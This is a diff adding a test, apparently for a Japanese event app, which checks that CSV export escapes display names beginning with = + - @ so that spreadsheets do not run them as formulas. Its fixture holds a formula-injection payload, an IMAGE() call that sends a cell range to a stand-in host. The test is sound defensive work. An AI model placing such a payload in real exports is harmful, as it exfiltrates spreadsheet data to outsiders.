@@ -124,3 +124,15 @@ test("カメラ判定：まったく同じ絵が10秒続いたら「止まって
   assert.equal(track.status, "error");
   assert.match(track.message, /止まっています/);
 });
+
+test("結果CSV：= + - @ で始まる表示名は、Sheets で式として動かないように ' を付ける", () => {
+  const event = new MiniEvent({
+    csvText: csv([
+      '1,＝IMAGE("https://x.example/?"&C2:C99),架空ジムA,OK,@ソラ,架空ジムB,OK,キッズ,曲A,曲B',
+      "2,-ミナト,架空ジムC,OK,+ハル,架空ジムD,OK,一般,曲C,曲D",
+    ]),
+  }).setup();
+  const text = resultsCsv(event.state);
+  assert.match(text, /^1,"'=IMAGE\(""https:\/\/x\.example\/\?""&C2:C99\)",'@ソラ,/m);
+  assert.match(text, /^2,'-ミナト,'\+ハル,/m);
+});
